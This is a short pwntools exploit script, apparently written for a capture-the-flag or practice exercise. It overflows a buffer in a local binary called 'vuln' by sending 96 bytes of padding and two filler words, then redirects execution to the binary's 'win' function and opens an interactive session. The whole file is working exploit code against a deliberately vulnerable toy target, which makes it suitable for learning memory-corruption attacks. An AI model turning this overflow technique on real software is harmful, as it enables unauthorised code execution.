from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

offset = 96
win = elf.symbols['win']
payload = ""
payload += "A"*offset
payload +=  p32(0xdeadbeef)
payload +=  p32(0xdeadc0de)
payload += p32(win)

p.sendline(payload)
p.interactive()